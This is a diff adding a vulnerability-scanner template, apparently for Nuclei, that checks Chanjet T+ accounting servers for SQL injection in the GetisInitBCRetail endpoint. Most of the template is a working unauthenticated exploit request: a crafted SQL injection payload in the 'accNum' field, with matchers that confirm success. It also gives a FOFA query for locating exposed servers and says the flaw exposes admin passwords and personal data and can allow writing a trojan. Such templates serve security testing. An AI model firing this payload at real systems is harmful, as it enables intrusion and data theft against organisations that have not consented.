@@ -1,0 +1,34 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+            - qvpxq1qpkxq
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+          Content-Type: application/json
+
+          {"accNum":"1' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab"}
+id: changjietong-GetisInitBCRetail-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: app="畅捷通-TPlus"
+        由于畅捷通T+的GetisInitBCRetail接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 畅捷通T+ GetisInitBCRetail SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/bBv3o53hMOH_AL9aI8_6PA
+    severity: high
+    tags:
+        - uIP
+        - 畅捷通-TPlus
+        - ajaxpro
